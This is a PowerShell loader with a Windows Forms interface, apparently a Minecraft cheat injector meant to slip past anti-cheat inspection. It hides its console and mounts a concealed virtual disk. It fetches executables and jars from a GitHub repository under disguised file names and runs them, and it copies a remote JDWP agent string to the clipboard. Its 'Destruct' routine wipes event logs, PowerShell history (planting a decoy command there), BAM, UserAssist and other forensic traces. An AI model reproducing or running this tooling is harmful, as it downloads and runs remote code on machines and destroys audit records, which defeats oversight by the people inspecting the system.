Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Add SetErrorMode API to suppress Windows Error Reporting dialogs on destruct
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class ErrorMode {
    [DllImport("kernel32.dll")]
    public static extern uint SetErrorMode(uint uMode);
}
"@

# Constants for error mode (to suppress critical error dialogs)
$SEM_FAILCRITICALERRORS = 0x0001
$SEM_NOGPFAULTERRORBOX = 0x0002
$SEM_NOALIGNMENTFAULTEXCEPT = 0x0004
$SEM_NOOPENFILEERRORBOX = 0x8000

# Add user32.dll functions to forcibly close error dialogs
Add-Type @"
using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class User32Methods {
    private const int WM_CLOSE = 0x0010;

    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    public static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);
    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    [DllImport("user32.dll")]
    public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

    public static void CloseWindowsErrorDialogs() {
        EnumWindows(delegate(IntPtr hWnd, IntPtr lParam) {
            const int maxChars = 256;
            StringBuilder className = new StringBuilder(maxChars);
            StringBuilder windowText = new StringBuilder(maxChars);
            GetClassName(hWnd, className, maxChars);
            GetWindowText(hWnd, windowText, maxChars);
            string cls = className.ToString();
            string title = windowText.ToString();

            // Detect common Windows Error Reporting dialog class names and titles
            if ((cls == "#32770") && 
                (title.Contains("Windows") && (title.Contains("Error Reporting") || title.Contains("Problem Reporting") || title.Contains("has stopped working")))) {
                // Post WM_CLOSE message to close the dialog
                PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
            }

            return true; // continue enumeration
        }, IntPtr.Zero);
    }
}
"@

# Enhanced stealth setup
Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue

# START OF KEY BUTTON DETECTION
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

try {
    $consolePtr = [Win32]::GetConsoleWindow()
    if ($consolePtr -ne [IntPtr]::Zero) {
        [Win32]::ShowWindow($consolePtr, 0) | Out-Null
    }
} catch { }

$VK_CONTROL = 0x11
$VK_MENU = 0x12
$VK_F11 = 0x7A

while ($true) {
    try {
        $ctrlPressed = [User32]::GetAsyncKeyState($VK_CONTROL) -band 0x8000
        $altPressed = [User32]::GetAsyncKeyState($VK_MENU) -band 0x8000
        $f11Pressed = [User32]::GetAsyncKeyState($VK_F11) -band 0x8000

        if ($ctrlPressed -and $altPressed -and $f11Pressed) {
            break
        }
        Start-Sleep -Milliseconds 100
    } catch {
        Start-Sleep -Milliseconds 500
    }
}

$ConfirmPreference = 'None'
$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'

$vdiskSizeMB = 2048
$randomName = [System.IO.Path]::GetRandomFileName().Replace('.', '')
$vdiskPath = "$env:TEMP\$randomName.vhd"

$createScript = @"
create vdisk file="$vdiskPath" maximum=$vdiskSizeMB type=expandable
select vdisk file="$vdiskPath"
attach vdisk
"@

try {
    $createScript | diskpart.exe 2>$null | Out-Null
} catch {
    exit 1
}

Start-Sleep -Seconds 1

$timeout = 0
$disk = $null
while ($timeout -lt 8) {
    try {
        $disk = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" } | Select-Object -First 1
        if ($disk) { break }
    } catch { }
    Start-Sleep -Milliseconds 500
    $timeout++
}

if ($disk) {
    try {
        if ($disk.IsOffline -eq $true) {
            Set-Disk -Number $disk.Number -IsOffline $false -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
        }
        if ($disk.PartitionStyle -eq 'Raw') {
            Initialize-Disk -Number $disk.Number -PartitionStyle MBR -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
        }
        $partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
        Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 800
    } catch { }
}

$soundFilePath = "Z:\na.wav"
function Download-SoundFile {
    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"
    $maxRetries = 2
    $retryCount = 0

    while ($retryCount -lt $maxRetries) {
        try {
            if (Test-Path "Z:\") {
                Invoke-WebRequest -Uri $soundUrl -OutFile $soundFilePath -TimeoutSec 8 -ErrorAction Stop
                if ((Test-Path $soundFilePath) -and ((Get-Item $soundFilePath).Length -gt 0)) {
                    return $true
                }
            }
        } catch { }
        $retryCount++
        if ($retryCount -lt $maxRetries) {
            Start-Sleep -Milliseconds 800
        }
    }
    return $false
}

$driveReady = $false
for ($i = 0; $i -lt 6; $i++) {
    if (Test-Path "Z:\") {
        $driveReady = $true
        break
    }
    Start-Sleep -Milliseconds 500
}

if ($driveReady) {
    Download-SoundFile
}

function Clear-BasicTraces {
    try { 
        if (Test-Path $vdiskPath) {
            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
        }
    } catch { }
}

function Clear-AllTraces {
    try {
        Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
        Set-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex' -ErrorAction SilentlyContinue

        $jumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
        Get-ChildItem -Path $jumpListPath -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

        $customJumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
        Get-ChildItem -Path $customJumpListPath -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

        $muiCachePath = "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
        if (Test-Path $muiCachePath) {
            Get-ItemProperty $muiCachePath -ErrorAction SilentlyContinue |
            ForEach-Object { $_.PSObject.Properties } |
            Where-Object { $_.Name -like "Z:\*" -or $_.Name -like "*java*" -or $_.Name -like "*diskpart*" } |
            ForEach-Object { Remove-ItemProperty -Path $muiCachePath -Name $_.Name -ErrorAction SilentlyContinue }
        }

        $bamPaths = @(
            "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
        )
        foreach ($bamPath in $bamPaths) {
            if (Test-Path $bamPath) {
                Get-ChildItem -Path $bamPath -ErrorAction SilentlyContinue | ForEach-Object {
                    $userPath = $_.PSPath
                    Get-ItemProperty $userPath -ErrorAction SilentlyContinue |
                    ForEach-Object { $_.PSObject.Properties } |
                    Where-Object { $_.Name -match "java\.exe|diskpart\.exe|mmc\.exe|powershell\.exe" } |
                    ForEach-Object { Remove-ItemProperty -Path $userPath -Name $_.Name -ErrorAction SilentlyContinue }
                }
            }
        }
        
        $userAssistPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
        if (Test-Path $userAssistPath) {
            Get-ChildItem -Path $userAssistPath -Recurse -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -like "*Count*" } | ForEach-Object {
                Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue |
                ForEach-Object { $_.PSObject.Properties } |
                Where-Object { $_.Name -like "*java*" -or $_.Name -like "*diskpart*" } |
                ForEach-Object { Remove-ItemProperty -Path $_.PSPath -Name $_.Name -ErrorAction SilentlyContinue }
            }
        }

        Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb" -Force -ErrorAction SilentlyContinue
        Start-Service -Name "WSearch" -ErrorAction SilentlyContinue

        $thumbcachePaths = @(
            "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db",
            "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\iconcache_*.db"
        )
        foreach ($path in $thumbcachePaths) {
            Get-ChildItem -Path $path -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        }

        $eventLogs = @("System", "Application", "Security", "Windows PowerShell")
        foreach ($log in $eventLogs) {
            Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
        }
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Microsoft-Windows-Kernel-Process/Analytic" 2>$null

        $jvmLogPaths = @(
            "$env:USERPROFILE\.java\deployment\log\*.log",
            "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
            "$env:USERPROFILE\AppData\Roaming\.minecraft\logs\*.log",
            "$env:USERPROFILE\AppData\Roaming\.minecraft\feather\logs\*.log",
            "$env:TEMP\hs_err_pid*.log"
        )
        foreach ($path in $jvmLogPaths) {
            Get-ChildItem -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
                Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
            }
        }

        if (Test-Path $vdiskPath) {
            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
        }

        Remove-Item -Path "$env:TEMP\*.vhd" -Force -ErrorAction SilentlyContinue

    } catch { }
}

# Create the main form
$form = New-Object System.Windows.Forms.Form
$form.Text = 'By Zpat - FAX'
$form.Size = New-Object System.Drawing.Size(942, 443)
$form.StartPosition = 'CenterScreen'
$form.BackColor = 'Black'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ForeColor = 'White'

# ASCII Art Label
$asciiArt = @"
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗███╗   ███╗██████╗  ██████╗ ██╗    ██╗███╗   ██╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗██║    ██║████╗  ██║
███████║███████║██║     █████╔╝ █████╗  ██╔████╔██║██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║╚██╔╝██║██║  ██║██║   ██║██║███╗██║██║╚██╗██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
"@

$label = New-Object System.Windows.Forms.Label
$label.Text = $asciiArt
$label.Font = New-Object System.Drawing.Font('Courier New', 9)
$label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(184, 87)

# Define Main Menu Buttons
$injectButton = New-Object System.Windows.Forms.Button
$injectButton.Text = 'Inject'
$injectButton.Width = 100
$injectButton.Height = 40
$injectButton.Location = New-Object System.Drawing.Point(196, 235)
$injectButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#29903b")
$injectButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$injectButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)

$destructButton = New-Object System.Windows.Forms.Button
$destructButton.Text = 'Destruct'
$destructButton.Width = 100
$destructButton.Height = 40
$destructButton.Location = New-Object System.Drawing.Point(730, 235)
$destructButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
$destructButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$destructButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)

# Function to return to main menu
function Show-MainMenu {
    $form.Controls.Clear()
    $form.Controls.Add($label)
    $form.Controls.Add($injectButton)
    $form.Controls.Add($destructButton)
}

# Inject Button Click Handler
$injectButton.Add_Click({
    # Disable the form during sound playback
    $form.Enabled = $false

    if (Test-Path $soundFilePath) {
        try {
            $player = New-Object System.Media.SoundPlayer
            $player.SoundLocation = $soundFilePath
            $player.PlaySync()
        } catch { }
    }

    $form.Controls.Clear()
    $form.Controls.Add($label)

    # Back Button
    $backButton = New-Object System.Windows.Forms.Button
    $backButton.Text = 'Back'
    $backButton.Width = 100
    $backButton.Height = 40
    $backButton.Location = New-Object System.Drawing.Point(730, 336)
    $backButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
    $backButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $backButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $backButton.Add_Click({ Show-MainMenu })

    $prestigeButton = New-Object System.Windows.Forms.Button
    $prestigeButton.Text = 'Prestige'
    $prestigeButton.Width = 120
    $prestigeButton.Height = 40
    $prestigeButton.Location = New-Object System.Drawing.Point(196, 235)
    $prestigeButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a167ff")
    $prestigeButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $prestigeButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $prestigeButton.Add_Click({
        try {
            if (-Not (Test-Path "Z:\NSFW.mp4")) {
                for ($i = 0; $i -lt 2; $i++) {
                    try {
                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium/sodium-mc1.21.4.jar" -OutFile "Z:\NSFW.mp4" -TimeoutSec 12 -ErrorAction Stop
                        if ((Test-Path "Z:\NSFW.mp4") -and ((Get-Item "Z:\NSFW.mp4").Length -gt 0)) {
                            break
                        }
                    } catch { }
                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                }
            }
            if ((Test-Path "Z:\NSFW.mp4") -and (Get-Command java -ErrorAction SilentlyContinue)) {
                Start-Process java -ArgumentList '-jar "Z:\NSFW.mp4"' -ErrorAction SilentlyContinue
            }
        } catch { }
    })

    $doomsdayButton = New-Object System.Windows.Forms.Button
    $doomsdayButton.Text = 'DoomsDay'
    $doomsdayButton.Width = 120
    $doomsdayButton.Height = 40
    $doomsdayButton.Location = New-Object System.Drawing.Point(326, 235)
    $doomsdayButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#2563eb")
    $doomsdayButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $doomsdayButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $doomsdayButton.Add_Click({
        try {
            if (-Not (Test-Path "Z:\cat.mp4")) {
                for ($i = 0; $i -lt 2; $i++) {
                    try {
                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium/sodium-extra-mc1.21.4.jar" -OutFile "Z:\cat.mp4" -TimeoutSec 12 -ErrorAction Stop
                        if ((Test-Path "Z:\cat.mp4") -and ((Get-Item "Z:\cat.mp4").Length -gt 0)) {
                            break
                        }
                    } catch { }
                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                }
            }
            if ((Test-Path "Z:\cat.mp4") -and (Get-Command java -ErrorAction SilentlyContinue)) {
                Start-Process java -ArgumentList '-jar "Z:\cat.mp4"' -ErrorAction SilentlyContinue
            }
        } catch { }
    })

    $vapev4Button = New-Object System.Windows.Forms.Button
    $vapev4Button.Text = 'VapeV4'
    $vapev4Button.Width = 120
    $vapev4Button.Height = 40
    $vapev4Button.Location = New-Object System.Drawing.Point(456, 235)
    $vapev4Button.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#006466")
    $vapev4Button.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $vapev4Button.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $vapev4Button.Add_Click({
        try {
            if (-Not (Test-Path "Z:\gentask.exe")) {
                for ($i = 0; $i -lt 2; $i++) {
                    try {
                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/svchost.exe" -OutFile "Z:\gentask.exe" -TimeoutSec 12 -ErrorAction Stop
                        if ((Test-Path "Z:\gentask.exe") -and ((Get-Item "Z:\gentask.exe").Length -gt 0)) {
                            break
                        }
                    } catch { }
                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                }
            }
            if (Test-Path "Z:\gentask.exe") {
                Start-Process "Z:\gentask.exe" -ErrorAction SilentlyContinue
            }
        } catch { }
    })

    $vapeliteButton = New-Object System.Windows.Forms.Button
    $vapeliteButton.Text = 'VapeLite'
    $vapeliteButton.Width = 120
    $vapeliteButton.Height = 40
    $vapeliteButton.Location = New-Object System.Drawing.Point(586, 235)
    $vapeliteButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#00f1e1")
    $vapeliteButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#171317")
    $vapeliteButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $vapeliteButton.Add_Click({
        try {
            if (-Not (Test-Path "Z:\ilasm.exe")) {
                for ($i = 0; $i -lt 2; $i++) {
                    try {
                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/conhost.exe" -OutFile "Z:\ilasm.exe" -TimeoutSec 12 -ErrorAction Stop
                        if ((Test-Path "Z:\ilasm.exe") -and ((Get-Item "Z:\ilasm.exe").Length -gt 0)) {
                            break
                        }
                    } catch { }
                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                }
            }
            if (Test-Path "Z:\ilasm.exe") {
                Start-Process "Z:\ilasm.exe" -ErrorAction SilentlyContinue
            }
        } catch { }
    })

    $phantomButton = New-Object System.Windows.Forms.Button
    $phantomButton.Text = 'Phantom'
    $phantomButton.Width = 120
    $phantomButton.Height = 40
    $phantomButton.Location = New-Object System.Drawing.Point(716, 235)
    $phantomButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#4c0eb7")
    $phantomButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $phantomButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $phantomButton.Add_Click({
        try {
            $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
            Set-Clipboard -Value $clipboardText -ErrorAction SilentlyContinue
        } catch { }
    })

    $form.Controls.Add($prestigeButton)
    $form.Controls.Add($doomsdayButton)
    $form.Controls.Add($vapev4Button)
    $form.Controls.Add($vapeliteButton)
    $form.Controls.Add($phantomButton)
    $form.Controls.Add($backButton)

    # Re-enable form to allow interaction with these buttons
    $form.Enabled = $true
})

# Enhanced Destruct Button Click Handler - FILELESS with error dialog suppression and forced dialog closing
$destructButton.Add_Click({
    [ErrorMode]::SetErrorMode($SEM_FAILCRITICALERRORS -bor $SEM_NOGPFAULTERRORBOX -bor $SEM_NOOPENFILEERRORBOX) | Out-Null

    # Attempt to forcibly close any Windows Error Reporting dialogs before exit
    [User32Methods]::CloseWindowsErrorDialogs()

    $form.Hide()
    [System.Windows.Forms.Application]::DoEvents()

    try {
        Clear-BasicTraces
        
        $disk = $null
        $timeout = 0
        while ($timeout -lt 6) {
            try {
                $disk = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" } | Select-Object -First 1
                if ($disk) { break }
            } catch { }
            Start-Sleep -Milliseconds 500
            $timeout++
        }

        if ($disk) {
            $detachScript = @"
select vdisk file="$vdiskPath"
detach vdisk
"@
            $detachScript | diskpart.exe 2>$null | Out-Null
        }

        Start-Sleep -Milliseconds 800

        if (Test-Path $vdiskPath) {
            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
        }

        Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
        Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force -ErrorAction SilentlyContinue

        Clear-AllTraces

    } catch { } finally {
        # Close any error dialogs one more time before shutting down
        [User32Methods]::CloseWindowsErrorDialogs()
        
        $form.Close()
        $form.Dispose()
        [System.Windows.Forms.Application]::Exit()

        Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
        exit 0
    }
})

Show-MainMenu

$form.Add_FormClosing({
    param($sender, $e)
    Clear-BasicTraces
    [System.Windows.Forms.Application]::Exit()
})

try {
    [System.Windows.Forms.Application]::Run($form)
} catch {
    Clear-AllTraces
    exit 0
}
